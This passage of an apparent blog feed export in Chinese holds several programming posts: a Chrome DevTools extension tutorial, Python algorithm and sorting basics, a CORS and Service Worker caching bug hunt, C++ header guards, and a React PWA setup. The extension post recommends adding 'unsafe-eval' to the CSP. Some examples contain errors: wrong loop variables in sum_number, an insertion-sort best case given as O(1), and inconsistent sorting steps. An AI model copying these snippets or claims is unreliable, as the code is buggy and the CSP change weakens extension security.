(function() &#123;  // 與 background.js 建立 channel 連結  const port = chrome.extension.connect(&#123;      name: &quot;Devtools.js Communication&quot;  &#125;);  const inspectedWindowId = chrome.devtools.inspectedWindow.tabId;  // Listen to messages from the background page  port.onMessage.addListener(function (message) &#123;      if (message.action === &quot;reloadExtension&quot; &amp;&amp; message.updatedTabId === inspectedWindowId) &#123;          const appNode = document.querySelector(&#x27;#app&#x27;);          removeHTMLChilds(appNode);          getPageTitle();      &#125;  &#125;);  function getPageTitle() &#123;      chrome.devtools.inspectedWindow.eval(          &quot;document.title&quot;,          function (result, isException) &#123;              const appNode = document.querySelector(&#x27;#app&#x27;);              const titleWrapper = document.createElement(&quot;div&quot;);              const title = document.createTextNode(result);               titleWrapper.appendChild(title);              appNode.appendChild(title);          &#125;      );  &#125;  function removeHTMLChilds(HTMLNode) &#123;      while (HTMLNode.firstChild) &#123;          HTMLNode.removeChild(HTMLNode.firstChild);      &#125;  &#125;  // init  getPageTitle();&#125;)();

我們利用 chrome.devtools.inspectedWindow.eval() 來執行 document.title，取得 page title 資訊，並利用 document.createElement 等原生 Web API 來將資訊呈現在頁面上。
接著這邊我們用到了 port.onMessage.addListener()，原因是我們想要 monitor 頁面的變化，像是 page reload 或是 page update。而這些資訊都只能透過 content script 或是 Background.js 才能取得，因此我們必須建立一個 messaging 的 channel，讓 background.js 告訴我們頁面是否更新了，若更新就重新繪製 Panel.html 的內容。
background.jschrome.runtime.onConnect.addListener(function (port) &#123;    chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) &#123;        if (changeInfo.status === &#x27;complete&#x27;) &#123;            reloadExtension(port, tabId);        &#125;    &#125;);    function reloadExtension(port, tabId) &#123;        const message = &#123; action: &quot;reloadExtension&quot;, updatedTabId: tabId &#125;;        port.postMessage(message);    &#125;&#125;);// `background.js` 透過 `chrome.runtime.onConnect.addListener`// 在與 devtools page 的 script 連接到後，監聽 `chrome.tabs.onUpdated` 事件，// 當 update status 為 complete 後，`postMessage()` 給 `Panel.html` 中的 `getPageTitle.js`。

此外，由於 Background.js 存在於整個 Browser 中，因此在 getPageTitle.js 中，需要透過 const inspectedWindowId = chrome.devtools.inspectedWindow.tabId; 取得當前 inspected page 的 tab id 來過濾其他 tab 的 event change。
就這樣我們就完成了一個可以取得頁面 Title 的 Devtools extension！雖然功能超廢但要是希望讓大家有個概念，知道要怎麼開始。基本上所有程式碼都在這邊了，但如果還是想直接載範例 code 來看的話可以移駕至 github，但只是 demo 用就是了…Demo 1 Demo 2
注意事項在 hackday 開發內部工具時其實踩到不少雷，而在上述的範例中比較難去說明，因此在文章的最後額外與大家分享：

載入外部檔案的方式 雖然在 devtools.html 或 Panel.html 中可以載入除了 devtools.js 外的檔案，但若是載入的檔案中存有 eval() 或著是透過 web 下載的 js，都會出現 CSP(content ecurity policy) 錯誤，而解法是在 manifest.json 中加上一行： “content_security_policy”: “script-src ‘self’ ‘unsafe-eval’; object-src ‘self’” 這樣就能解決 js 中存有 eval() 或是 setTimeout() 所造成的 CSP error 
 而若要載外部資源，則還要另外將其 domain 也加進去，當作 white list “content_security_policy”: “script-src ‘self’ ‘unsafe-eval’ https://maps.googleapis.com/; object-src ‘self’”

chrome.devtools.inspectedWindow.eval 長度限制 在製作內部工具時，其實是需要從 inspected page 的 context 中取出大量資料到 Panel.html 中進行處理，而透過 inspectedWindow.eval 的方式並沒有辦法傳送太大量的 JSON object，因此我是先將其 JSON.stringify() 後才往後傳的。 eg. chrome.devtools.inspectedWindow.eval( &quot;JSON.stringify(context.getStore())&quot;。


結論今天透過兩種範例介紹了如何用最主要的 Devtools API 來搭建 Devtools extension，但當然還有許多 API 或是 Event 沒有介紹到，像 panels 就有 onShown, onHide 等監聽 devtools 是否有開啟的事件可以用，不過很難從一次的範例中全部介紹到，有需要的話還是得去查看官方文件。至少希望能讓大家對於製作增加自己工作效率的工具有一個初步的開始方向，有任何問題也歡迎提出指教！

資料來源
Google offical doc
Chrome Extension CSP 開發小記
Chrome 插件(擴展)全攻略

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>Chrome</tag>
        <tag>devtools</tag>
        <tag>extension</tag>
      </tags>
  </entry>
  <entry>
    <title>基礎電腦科學：演算法概要</title>
    <url>/2019/03/01/computer-science-algorithm-introduction/</url>
    <content><![CDATA[
前言隨著資訊科技發展，演算法已經無所不在存在我們的生活當中。舉凡上網 google 搜尋資料、下載檔案的壓縮方法、檔案的加密傳輸等，都可以看到演算法運作的蹤跡。一般來說資料結構和演算法是程式設計最基本的內涵，所以有人說：程式設計 = 資料結構 + 演算法。那究竟什麼是演算法&#x2F;算法呢？
咱們維基百科給了個非常需要慧根才能理解的解釋：

演算法（algorithm），在數學（算學）和電腦科學之中，為任何良定義的具體計算步驟的一個序列，常用於計算、資料處理和自動推理。精確而言，演算法是一個表示爲有限長，列表的有效方法。演算法應包含清晰定義的指令，用於計算函式。

我們把它翻譯成人話吧：

演算法是一個有輸入且有輸出的解決問題的步驟，它具有明確和有限步驟且有效的特性

舉例來說，我們今天要創作一道蔥花蛋或菜脯蛋，我的步驟會是把材料當做輸入：

放點油
打蛋
如果喜歡蔥花可以加入蔥花，如果喜歡菜脯可以加入菜脯（程式術語：if...else 條件判斷）
放入少許鹽巴
中火快炒，翻五次面（程式術語：for 迴圈）
當看到蛋面呈現金黃色時可以起鍋，結束料理（程式術語：while 迴圈）
好吃的蔥花蛋或菜脯蛋上桌

透過清楚明確的有限步驟，我們可以解決我們想解決的問題並產出我們要的輸出結果
演算法的定義一般演算法嚴謹的條件必須符合：

輸入（Input）：0 或多個輸入
輸出（Output）：至少有一個回傳結果（有可能回傳 0 或是 null）
明確性（Definiteness）：每一個指令步驟必須明確
有限性（Finiteness）：在有限步驟後一定會結束不會進入無窮迴圈
有效性（Effectiveness）：步驟清楚可行，能使用紙筆計算求解

舉個例子：
下面是一個 Python 判斷是否可以投票的演算法（假設可以投票為 18 歲），仔細看下面的算法雖然簡單但有輸入也有輸出，且有明確有限步驟，步驟可行
def check_can_vote(age):    if age &gt;= 18:        return True    else:        return Falsecheck_can_vote(20)

評估複雜度事實上，解決一個問題不一定只有一種演算法。那我們怎麼評估演算法的好壞呢？一般來說會有兩種方式：時間複雜度和空間複雜度，比較常見的是使用時間複雜度
時間複雜度（Time Complexity）想要評估一個演算法執行速度快慢，最直覺的方式是測量演算法計算的時間。但由於執行時間會受不同電腦&#x2F;計算機機器硬體規格與實作方式影響，很難放諸四海皆準，因此學術上傾向於統計演算法步驟數目，當做時間複雜度可考量。
最常見的評估演算法好壞就是時間複雜度，時間複雜度是指運用概量（漸近分析 asymptotic analysis，例如：當 f(n) &#x3D; n^2 + 3n 這個函數 n 很大時，3n 會比 n^2 小很多，可以忽略不計。當 n 趨近無限大時，f(n) 等價於 n^2）而非絕對時間（因為會牽涉到電腦&#x2F;計算機環境變因，所以絕對時間不容易準確），通常我們使用 Big O notation 大 O 符號來表示時間複雜度。假設算法函式所需執行時間為 T(n) ，則我們將其時間複雜度表示為 O(f(n))。f(n) 又稱為執行時間的成長率，是影響速度最大的變數。
首先我們先來看 O(1) 的例子，這個演算法執行的步驟是固定的，跟輸入的值無關：
# 不管 n 輸入為多少，這個程式永遠只會執行一次def print_num(num):    print(num)print_num(10)

下面這個例子就是 O(n) 的例子，時間複雜度跟輸入的次數有關，隨著 num 變大所需要跑 num 次，是線性時間的成長。這邊 f(n) 等於 n，所以 O(f(n)) 就是 O(n)
def sum_number(num):    total = 0    for n in num:        total += num    return totalsum_number(10)

O(nlog(n))
一般常見的時間複雜度如下圖表是：
空間複雜度演算法的空間複雜度是指演算法所需要消耗的儲存記憶體資源。其計算和表示方法與時間複雜度類似，一般都用複雜度的漸近性來表示（asymptotic analysis）。
例如下面這個函式，不管程式跑了多少遍，都不會影響使用的變數數量，故該函式的空間複雜度為 O(1)：
def sum_number(num):    total = 0    for n in num:        total += num    return totalsum_number(10)

但下面這個函式，會隨著丟進去的數字而影響變數的量，例如：
輸入為 n，就換產生 n 個變數空間需要儲存，故該函式空間複雜度為 O(n)
def sum_number(num):    total = []    for n in num:        total.append(num)sum_number(10)

總結以上簡單介紹了演算法入門教學。隨著資訊科技發展，演算法已經無所不在存在我們的生活當中。舉凡上網 google 搜尋資料、下載檔案的壓縮方法、檔案的加密傳輸等，都可以看到演算法運作的蹤跡，所以值得我們細細品味。那我們下回見囉！
參考文件
台師大演算法筆記
演算法與資料結構
大O符號
Algorithm Analysis
All you need to know about “Big O Notation” to crack your next coding interview

（image via pandorafms、freecodecamp）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>algorithm</tag>
        <tag>程式設計</tag>
        <tag>programming</tag>
        <tag>coding</tag>
        <tag>演算法</tag>
        <tag>算法</tag>
        <tag>computer science</tag>
        <tag>電腦科學</tag>
      </tags>
  </entry>
  <entry>
    <title>基礎電腦科學：排序（sorting）演算法入門上</title>
    <url>/2019/03/10/computer-science-sorting-algorithm-part1/</url>
    <content><![CDATA[
前言排序（sorting）和搜尋（search）是演算法（algorithm）中最常見的入門知識。雖然我們在一般程式開發的場合中較少會需要自己實作排序和搜尋演算法，但排序（sort）和搜尋（search）的觀念也常出現在其他的演算法當中，應用層面很廣。本系列文章將使用 Python 來實作幾個經典演算法。首先我們先來介紹：選擇排序、插入排序和氣泡排序法。
選擇排序法選擇排序法是一種十分直觀的排序演算法（就是選擇最小的值和第一個初始值互換），其基本原理如下：

給定一個數字組合和初始最小值位值（一開始 index 為 0）
經過第一輪每個數字和最小值比較，將取出的最小值和第一個數字位置對調（選擇最小的值）
接著除了第一個已排序好的數字外，其餘數字持續最小值比較（index 為 1），若有更小值則和 index 為 1（第二個）值互換
持續進行比較到能比較的值只剩下一個，則由小到大的排序完成

舉例來說；
有一個串列 [9, 4, 11, 2, 7] 希望由小到大排序。
初始最小值為 index &#x3D; 0 的 9

第一次排序後：2 [4, 11, 9, 7]：2 比 9 小，所以互換位置

第二次排序後：2, 4, [11, 9, 7]，4 為初始最小值，沒有可以互換的值

第三次排序後：2, 4, [11, 9, 7]，11 為初始最小值，7 是右邊比 11 小的最小值，兩者互換

第四次排序後：2, 4, 7, [9, 11]，9 為初始最小值，沒有可以互換的值

第五次排序後：2, 4, 7, 9, [11]，11 為初始最小值，沒有可以互換的值

最後排序結果：2, 4, 7, 9, 11


使用 Python 程式實作：
def selection_sort(num_list):    &quot;&quot;&quot;    :param num_list: a list want to sort    &quot;&quot;&quot;    num_list_length = len(num_list)    for i in range(0, num_list_length):        min_num_index = i        for j in range(i + 1, num_list_length):            if num_list[min_num_index] &gt; num_list[j]:                min_num_index = j        num_list[min_num_index], num_list[i] = num_list[i], num_list[min_num_index]    return num_listif __name__ == &#x27;__main__&#x27;:    num_list = [9, 4, 11, 2, 7]    print(&#x27;選擇排序前：&#123;&#125;&#x27;.format(num_list))    print(&#x27;選擇排序後：&#123;&#125;&#x27;.format(selection_sort(num_list)))

選擇排序法是一種不穩定排序方法，且需要迭代多次，其最好和最壞以及平均時間複雜度皆為 O(n^2)，所需儲存空間不因輸入個數改變。僅儲存一個 index 值，故空間複雜度為 O(1)
插入排序法插入排序法就像是玩大老二撲克牌一開始整理手牌一樣，拿到新發的牌就插入已排序好的手排對應的位置，其基本原理如下：

給定一個數字組合並假設第一個值成為一已排序數列
經過第一輪每個數字和已排序數列比較，將值插入已排序數列對應位置
直到最後一個數字也已插入已排序列中則排序結束

舉例來說：
有一個串列 [9, 4, 11, 2, 7] 希望由小到大排序。

第一步插入 9 後：[9], 4, 11, 2, 7

第二步插入 4 後：[4, 9], 11, 2, 7

第三步插入 11 後：[4, 9, 11], 2, 7

第四步插入 9 後：[2, 4, 9, 11], 7

最後排序結果：[2, 4, 7, 9, 11]


使用 Python 程式實作：
def insert_sort(num_list):    &quot;&quot;&quot;    :param num_list: a list want to sort    &quot;&quot;&quot;    num_list_length = len(num_list)    for i in range(1, num_list_length):        insert_value = num_list[i]        j = i - 1        while j &gt;= 0:            if num_list[j] &gt; insert_value:                num_list[j + 1] = num_list[j]                num_list[j] = insert_value            j -= 1    return num_listif __name__ == &#x27;__main__&#x27;:    num_list = [9, 4, 11, 2, 7]    print(&#x27;插入排序前：&#123;&#125;&#x27;.format(num_list))    print(&#x27;插入排序後：&#123;&#125;&#x27;.format(insert_sort(num_list)))

插入排序法是一種穩定排序方法，其最好情況下時間複雜度為 O(1)（一開始已經排序好），最壞以及平均時間複雜度為 O(n^2)。所需儲存空間不因輸入個數而改變，故空間複雜度為 O(1)
氣泡排序法氣泡排序法顧名思義就是在排序的過程中，排序的值兩兩比較，大的值就像氣泡一樣由水底往上升（往一邊靠攏）。單向氣泡排序基本思路如下（假設由小到大排序）：
對於給定 n 個數值，一開始由第一個值依序和之後每個值兩兩比較，若目前值比記錄值大時則交換位置。當完成一輪比較後最大值將於第 n 位，然後前 n - 1 位進行第二輪比較，重複進行過程到只剩下一位為止。
舉例來說；
有一個串列 [9, 4, 11, 2, 7] 希望由小到大排序。

第一輪交換後：4, 9, 2, 7, 11

第二輪交換後：4, 2, 7, 9, 11

第三輪交換後：2, 4, 7, 9, 11

最後排序結果：2, 4, 7, 9, 11


使用 Python 實作：
def bubble_sort(num_list):    &quot;&quot;&quot;    :param num_list: a list want to sort    &quot;&quot;&quot;    list_length = len(num_list)    for i in range(0, list_length):        for j in range(i + 1, list_length):            if num_list[i] &gt; num_list[j]:                num_list[i], num_list[j] = num_list[j], num_list[i]    return num_listif __name__ == &#x27;__main__&#x27;:    num_list = [9, 4, 11, 2, 7]    print(&#x27;氣泡排序前：&#123;&#125;&#x27;.format(num_list))    print(&#x27;氣泡排序後：&#123;&#125;&#x27;.format(bubble_sort(num_list)))

氣泡排序法是一種穩定排序方法，其最好情況下時間複雜度為 O(n)（一開始已經排序好），最壞以及平均時間複雜度為 O(n^2)。所需儲存空間不因輸入個數而改變，故空間複雜度為 O(1)。
總結以上簡單介紹了選擇排序、插入排序和氣泡排序法並使用 Python 來實作幾個經典演算法，下回我們將持續介紹更多經典且常用的演算法，那我們下次見囉！
參考文件
台師大演算法筆記
演算法與資料結構
大O符號
Algorithm Analysis
All you need to know about “Big O Notation” to crack your next coding interview

（image via pandorafms、brilliant）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>algorithm</tag>
        <tag>程式設計</tag>
        <tag>programming</tag>
        <tag>coding</tag>
        <tag>演算法</tag>
        <tag>算法</tag>
        <tag>computer science</tag>
        <tag>電腦科學</tag>
      </tags>
  </entry>
  <entry>
    <title>原來 CORS 沒有我想像中的簡單</title>
    <url>/2018/08/18/cors-issue/</url>
    <content><![CDATA[前言CORS（Cross-Origin Resource Sharing，跨來源資源共享）在前端一直是個很經典的問題，簡單來說就是因為瀏覽器的一些安全考量，你在載入其他網域的資源時會受到一些限制，解決方法也很簡單，就是在 Server 那邊加上一些 response header 例如說 Access-Control-Allow-Origin，有了這個 header 之後瀏覽器就會認為你是有經過驗證的，就沒什麼問題了。
針對這個問題，我以前也有寫過一篇：輕鬆理解 Ajax 與跨來源請求，裡面把碰到的問題與解法寫得十分詳細。
我以為自從我上次深入研究過這個問題之後，從此以後 CORS 再也難不倒我，再也不會看到 console 跳出禁止跨來源存取的錯誤。
但是我錯了。
這次我在一個特定的使用場景之下摔了一跤，但也因此學到不少。而這次的經驗也讓我想起我以前寫的：我遇過的最難的 Cookie 問題
。
太好了，又有東西可以跟大家分享了！
悲劇的開始事情是這樣的，前陣子公司的產品改版進入收尾階段，嚴重的 bug 都修得差不多了，接下來就是要開始調整一些效能以及測試這次改版最重要的新功能：PWA！
還不知道什麼是 PWA 的我在這邊簡單說明一下，PWA 全名是 Progressive Web App，簡單來說就是把你的 Mobile Web 透過一些瀏覽器的支援變得更像是一個 App，最重要的就是你可以用 Service Worker 來快取任何的 request（連 API request 也行），做得好的話甚至在 offline 的狀況也能夠把這個網頁打開。
除此之外呢，透過瀏覽器可以把你的網站加到主畫面，就像是安裝在手機裡面那樣，變得跟一個 App 沒有兩樣。
下面附上三張截圖，會讓大家對 PWA 更有感覺，首先第一張是你可以把這個網頁加入主畫面：

第二張是這個 PWA 就會跟其他的 Native App 一樣，存在你的手機裡面，你光看這頁絕對分不出來這到底是 Native App 還是 PWA。

最後一張是你開啟這個 PWA 之後，會變成全螢幕，光看這個截圖根本就跟 Native App 沒兩樣。

總之呢，可以把 PWA 想成：現有的網站 + 新技術（Service Worker、manifest.json…），搭配起來就可以變 PWA 了。
對 PWA 簡單的介紹就到這裡，想看更多的可以參考 @arvinh 寫過的：Progressive Web App 會是未來趨勢嗎？或是當 React web app 遇上 Progressive web app。
對 PWA 來說，其實最重要的就是這個 Service Worker（以下簡稱 SW），Chrome 內建的 Lighthouse 就可以針對網頁給一個 PWA 的分數，SW 就是其中一個考量的項目，因為你必須實作 SW 才能快取檔案並且實作出離線也能開啟 App 這個功能。
下圖是 Lighthouse 會檢測的項目：

好，前情提要結束，可以來進入正題了。
我們的 PWA 該做的都做了，有註冊 SW，也有實作離線可以開啟的功能，可是卻發生了一件事，那就是在 Lighthouse 的檢測裡面，有一項永遠都過不了，那就是註冊 SW。
無論檢驗多少次，Lighthouse 都一直說我們的網站沒有註冊 SW。
超級無敵奇怪，我開無痕用乾淨的 Chrome 手動去測試，無論怎麼測我都確認一定有註冊 SW，可是 Lighthouse 怎麼測都說沒有。
那怎麼辦呢？
幸好 Lighthouse 是開源的，而且有提供 CLI 的版本，你可以自己在你電腦上面跑。
於是我想說既然 Lighthouse 說沒有，那我們就來看看 Lighthouse 是怎麼檢測的好了，然後我就稍微研究了一下 Lighthouse 的原始碼，覺得檢測的方法看起來也沒什麼問題，於是我決定把 Lighthouse 改一下，讓它跑完測試的時候不會把視窗關起來，這樣我就可以看 console 有沒有什麼有用的資訊，看看註冊成功會印的訊息有沒有印出來。
我稍微改動了幾個地方：

增加設定檔，只跑 SW 的測試
跑完之後不會把 Chrome 關掉
在 SW 的檢查那邊印 log

如果有需要的，我更改的部分在這邊：改動的地方的 PR
改完以後重新跑一遍測試，那一刻，我終於想起了被 CORS 困擾下的恐懼：

撥雲見日既然有了一些線索就應該好好追查下去，從截圖裡面看起來，SW 是成功註冊了，但是在用 SW 快取檔案的時候碰到一些錯誤，所以好像連帶影響了整個測試。總之呢，只要把這個 CORS 問題解決掉就沒事了吧。
先幫大家再做個背景說明，我們這些靜態檔案都是放在 Amazon S3，然後前面再掛 Cloudfront，我們已經有乖乖按照 Amazon 的指示加上該加的東西，所以只要 request header 有 origin，response 就一定會有 CORS 的 header，所以一定不會發生這個錯誤。
而 SW 在快取檔案的時候是用 fetch，所以也一定會加上 origin 這個 header，沒理由出問題。
大概卡了一兩個小時還是還無頭緒，於是我決定看一下 network 的 tab，發現了更多線索：
下面這一張是從 SW 裡面發出的 request，header 裡面確實有 origin，可是 response 卻沒有 Access-Control-Allow-Origin！
除此之外，發現更早以前也有一個相同的 request，因為這個 request 是由 &lt;script&gt; 發出的，所以不會帶上 origin，因此 response 也就沒有 CORS 的 header。
而這邊值得注意的事情是，第二個 response 是 from disk cache（雖然上面兩個都是，但那是因為我截圖的時候東西沒清空，事實上應該只有第二個是）
查線索查到這裡，大概有點頭緒了。
深入追查好，讓我先來解釋一下。
SW 所要快取的那個檔案是頁面會載入的其中一個 JavaScript，而因為頁面會載入，所以在 HTML 裡面我們放了一個 &lt;script&gt; 的 tag 來載入這個檔案，從上面的圖片看起來，瀏覽器先載入了這個 JavaScript 檔案，然後因為這個檔案不是用 ajax 發出，所以沒有 origin，根據 S3 的規定，也就自然沒有 Access-Control-Allow-Origin。
再來呢，SW 註冊成功，開始執行裡面的程式碼把我們預先準備好的清單給快取住，其中一個就是這個 JavaScript 的檔案，但是當我們用 fetch 來抓這個檔案時，瀏覽器直接用了快取住的前一個的 response（因為 URL、method 都一樣），而這個 response 是沒有 Access-Control-Allow-Origin 的！因此就跳出了我們最前面看到的跨網域的錯誤。
到這邊真相大白了，都是瀏覽器快取的問題。
那為什麼我之前自己測都測不出來呢？因為身為一個前端工程師，devtool 有把「Disable cache」打勾是很合情合理的事，所以我怎麼試都試不出來這個問題。
知道問題的成因之後就比較簡單了，拜了 Google 大神查到了這一篇 Chromium 的 ticket：CORS Preflight Cache Does not Consider Origin
裡面碰到的問題基本上跟我碰到的差不多，最後給的解法是 response 加上一個 Vary: Origin，讓瀏覽器知道如果 Origin 不一樣的話就不要用快取，可是我發現我們早就加了但不知道為什麼沒用。
除此之外也找到幾個類似的問題：

Chrome S3 Cloudfront: No ‘Access-Control-Allow-Origin’ header on initial XHR request
S3 CORS, always send Vary: Origin

後來採用裡面其中一個的解法：「既然 S3 要有 origin header 才能開啟 CORS，那就用 Cloudfront 傳一個固定的 origin 給它吧！這樣每個 response 都一定會有 Access-Control-Allow-Origin 了！」
可以參考這篇：AWS CloudFront + S3 + Allow all CORS，基本上就是調一個設定而已。
這招聽起來滿有效的，但其實不是最好的解法，感覺有點骯髒，畢竟 origin 這東西不是這樣用的，為了 S3 的機制硬要這樣做總覺得不是太好。
於是最後我就想到一個東西，同時也解決了心中的一個疑惑。
那就是在&lt;script&gt;加上 crossorigin=&quot;anonymous&quot;，讓&lt;script&gt;發出去的 request 也有 origin header！
我以前就看到某些地方會加這個，但始終不懂為什麼要加，因為 script 本來就可以不限制網域，為什麼還要特地加一個 tag 讓它變成像 ajax 那樣的 request？
但沒想到我居然被這個屬性幫助到了，一旦我加了這個，那 script 的載入就會附上 Origin，S3 就會回傳 Access-Control-Allow-Origin，也就不會碰到之後的跨網域問題了！
至於這個屬性其他的功用，可參考：Purpose of the crossorigin attribute …?
總結要碰到我所碰到的這個問題，你必須同時滿足下面四個條件：

你把靜態檔案放在 S3 上面
你沒有勾選瀏覽器的 Disable cache
你用 script 跟 SW 載入同一個檔案
瀏覽器用快取的 script 的 response 回應 SW 的請求

只要任何一個條件沒有滿足，就不會碰到這問題。換句話說，要踩到這個坑其實也挺困難的。
但坑踩的越多就越強，解決了一個問題就代表你未來會碰到的問題又少了一個。解決掉這個 CORS 相關的問題，我想我以後應該不會再碰到相關的問題了…吧。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>cors</tag>
        <tag>pwa</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ Header Guard 簡介</title>
    <url>/2017/09/30/cpp-header-guard/</url>
    <content><![CDATA[前言C++ 的 header guard (中文譯作表頭哨兵，聽起來超帥) 是在開源&#x2F;大型專案中常常用到的功能，所以如果想要踏入開源專案的世界，看到 header guard 就覺得親切熟悉，絕對可以幫助你更把心思放在體會到這些開源程式碼的美！
而且這個例子正巧是有朋友去面試美國某間新創公司時，實際被問到的問題，所以才興起想要動筆寫下這篇文章的念頭。畢竟很多小地方有沒有真正弄通是技術實力紮不紮實的重要指標！
我剛剛隨便選了一個 C++ 的開源專案 (Point Cloud Library) 的 header 檔，裡面就有用到
#ifndef PCL_PEOPLE_PERSON_CLASSIFIER_H_#define PCL_PEOPLE_PERSON_CLASSIFIER_H_#include &lt;pcl/people/person_cluster.h&gt;#include &lt;pcl/people/hog.h&gt;...#include &lt;pcl/people/impl/person_classifier.hpp&gt;#endif /* PCL_PEOPLE_PERSON_CLASSIFIER_H_ */

預處理器簡介首先我們需要對 header file 的使用有個初步的認識，這就不能不介紹一下預處理器。我們都知道，要使用 header file 就是要在程式碼中 #include 它，而 #include 就是預處理器的一部分。
預處理器存在的目的是為了處理程式碼內的文本，例如 header file 的內容，之所以稱做 “預” 處理器是因為他在編譯氣執行之前就會先做事了。以 header file 的例子來說，預處理器會以 header file 的內容取代 #include 那一行。
那為何需要 header guard原因是，header file 也常常需要 #include 其他 header file，例如寫程式時可能會寫到如下的程式碼：
main.cpp:
#include &lt;string&gt;#include &quot;myHeader1.h&quot;#include &quot;myHeader2.h&quot;...

myHeader1.h:
#include &lt;string&gt;...

如果在 myHeader1.h 裡面也需要用到 string，那可想而知經過預處理器的處理後，main.cpp 裡面就會有兩次 #include &lt;string&gt;，但這種情況根本超級常見啊，我們總不可能都去檢查過 myHeader1.h、myHeader2.h 跟他們 include 的所有 header file 再決定自己要不要 #include &lt;string&gt; 吧。所以就要有個機制，讓 header file 即便被 include 多次，也不會有其內定義的 classes 和 objects 被多次定義。而通常，我們就是用 header guard 來做這件事。
header guard 怎麼運作這時候就讓我們再回過頭來看看前言提到的例子：
#ifndef PCL_PEOPLE_PERSON_CLASSIFIER_H_#define PCL_PEOPLE_PERSON_CLASSIFIER_H_#include &lt;pcl/people/person_cluster.h&gt;#include &lt;pcl/people/hog.h&gt;...#include &lt;pcl/people/impl/person_classifier.hpp&gt;#endif /* PCL_PEOPLE_PERSON_CLASSIFIER_H_ */

這邊使用到的是名為預處理器變數（preprocessor variables）的東西，在此例中為 PCL_PEOPLE_PERSON_CLASSIFIER_H_，而預處理器變數只有兩種狀態；已定義和未定義。所以上面的寫法就是用 #ifndef 來判斷是否已經定義過 PCL_PEOPLE_PERSON_CLASSIFIER_H_，如果沒有，那就先定義 PCL_PEOPLE_PERSON_CLASSIFIER_H_，然後才 #include 後面的東西。
看到這邊讀者們應該不難推敲，只要在需要 #include 的地方都加上類似的預處理器變數檢查，那就只有在預處理器變數還沒被定義時才會 #include，一旦被定義過了，就不會再重複定義了。
再回過頭來，如果你去看 string.h 的內容，你就會看到：
#ifndef _STRING_H_#define _STRING_H_ 1...

這樣一切就都串起來了！
總結以前在學生時代學習程式語言的時候，常常會有學了某個東西不知道好用在哪裡的感覺，header guard 就是一個好例子。透過開源專案，我們很容易欣賞到某個功能的美，也希望大家看完這篇之後，每次看到 header guard 都能感覺世界真美好 XD
關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有&gt;少許研究，最近在學習看清事物的本質與改進自己的觀念
]]></content>
      <tags>
        <tag>C++</tag>
        <tag>header file</tag>
        <tag>header guard</tag>
      </tags>
  </entry>
  <entry>
    <title>當 React web app 遇上 Progressive web app</title>
    <url>/2016/09/17/create-react-pwa/</url>
    <content><![CDATA[先前介紹過 Progressive Web App，我們利用 vanilla js 與 css 刻出一個支援 PWA 的天氣 web app，但現在應該很少人這麼有風格的用純 JS 寫 web app，世俗如我還是會想用 React 來支援前端框架，但 React 的 configuration 就已經頗複雜，要再加上 service-worker 的設定，想想就覺得累。
好在 facebook 先前推出 create-react-app 這個工具，幫你預先設定好一些 config，並且隱藏起來（還是想要自己設定的話，可以透過 npm run eject 這個指令），如果是中小型專案應該很適合。
因此，問題就剩下加上 service worker 這段了。
幸運的是，Google chrome 的開發成員有一個 open source 的 repository - create-react-pwa，是基於 create-react-app 的架構去支援 PWA。
不過實際上我使用起來還是有些地方需要微調與注意的，所以今天就是來帶著大家一步一步把你從 create-react-app 中所創建的 React Web App 加入 PWA 的支援。
Add PWA support in your create-react-app

以防大家沒用過 create-react-app，這邊稍稍介紹一下。首先你要先透過 create-react-app 來產生你的 web app:
npm install -g create-react-app
create-react-app react-pwa-boilerplate
接著就會產生以下結構的資料夾：


當然 src 內的結構你可以依照你自己需求調整。
接著 npm start 即可在 localhost:3000 看到頁面了。
而在有了一個 react web app 的雛形後，我們就可以來加上 PWA 的支援了！
Step I - sw-precache要能夠擁有 Progressive Web App 的能力，需要 Service Worker 的幫助，除了自己撰寫 service-worker 以外，我們可以利用 Google 出的 sw-precache 來幫我們產生需要的 service-worker.js。
在 package.json 中的 devDependencies 加入 sw-precache：
package.json&quot;devDependencies&quot;: &#123;  &quot;react-scripts&quot;: &quot;0.4.1&quot;,  &quot;sw-precache&quot;: &quot;^4.0.0&quot;&#125;,
or npm install sw-precache --save
接著，在 package.json 中的 script 內，我們要修改一下 build 的指令：
package.json&quot;scripts&quot;: &#123;  &quot;build&quot;: &quot;react-scripts build &amp;&amp; cp manifest.json favicon.ico build/ &amp;&amp; sw-precache --navigate-fallback=&#x27;index.html&#x27; --root=&#x27;build/&#x27; --static-file-globs=&#x27;build/**/!(*map*)&#x27;&quot;,&#125;

這個指令做了幾件事情：

react-scripts build 是原本 create-react-app 的指令，將相關的 react component 等等透過 webpack 幫你編譯轉譯後放到 build folder 底下。

cp manifest.json favicon.ico build/ ： manifest.json 與 favicon.ico 都是 PWA 需要的東西，待會會在說明內容。因為原本的 react-scripts build 中並不會產生這樣的東西，自然也不會幫你 build 進去，但我們需要讓 service worker 能儲存它們，所以這邊就手動把他放入 build 底下。

sw-precache --navigate-fallback=&#39;index.html&#39; --root=&#39;build/&#39; --static-file-globs=&#39;build/**/!(*map*)&#39; ：


這個指令透過 sw-precache，產生一個 service-worker.js 的檔案，他會自動幫你把 build folder 底下的 static 檔案都暫存起來！
--navigate-fallback=&#39;index.html&#39; 這個 flag 是為了讓你使用 React Router 而放入的。如果你是根據 facebooke 的 doc 加入 react-router，並且 deploy 到 github page，那你必須加入這個 flag，這樣一來，當 user 在切換動作而改變 url 時，任何的 random url 都會 fallback 到 index.html，其實也就是你 single page 的那個 entry 點，service-worker 才能夠找得到 cache。
--static-file-globs：這個 flag 讓 sw-precache 存 source map 外的所有 static files。
Step II - manifest.json再來是 PWA 中很重要的 manifest.json，能不能順利在 mobile 上 Add to homescreen 就要靠這份檔案：
